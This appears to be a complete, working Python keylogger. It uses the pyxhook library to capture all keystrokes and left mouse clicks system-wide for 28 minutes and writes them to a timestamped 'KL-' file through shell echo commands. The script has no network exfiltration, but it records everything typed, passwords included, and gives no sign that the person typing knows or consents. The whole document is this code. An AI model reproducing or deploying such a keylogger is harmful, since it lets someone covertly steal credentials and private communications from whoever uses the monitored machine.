#!/usr/bin/env python3

import pyxhook
from datetime import datetime
import os
import time

start_time = time.time()
end_time = start_time + 60*28

def KeyPress(event):
    k = event.Ascii
    if k == 34 or k == 39:
        #print(chr(k))
        command = "echo -n \\"+chr(k)+""" >> """+out_file
        os.system(command)
    elif 31< k < 128 and event.Key not in blacklist:
        #print(chr(k))
        command = "echo -n '"+chr(k)+"' >> "+out_file
        os.system(command)
    elif k == 8:
        #print(" ^b ")
        command = "echo -n ' ^b ' >> "+out_file
        os.system(command)
    elif k == 13:
        #print()
        command = "echo '' >> "+out_file
        os.system(command)


def MouseClick(event):
    if event.MessageName.split(' ')[1] == "left":
        #print("CLICK")
        command = "echo -n ' <click> ' >> "+out_file
        os.system(command)


begin = datetime.now().strftime("%d%b%Y-%T")

out_file ="tmp/KL-"+begin+".txt"

command = "echo START "+begin+" >> "+out_file
os.system(command)


blacklist = ["Up","Down","Left","Right"]


hm = pyxhook.HookManager()
hm.KeyDown = KeyPress
hm.MouseAllButtonsDown = MouseClick
hm.HookKeyboard()
hm.start()

while time.time() < end_time:
    time.sleep(10)

end = datetime.now().strftime("%d%b%Y-%T")
command = "echo END "+end+" >> "+out_file
os.system(command)
hm.cancel()
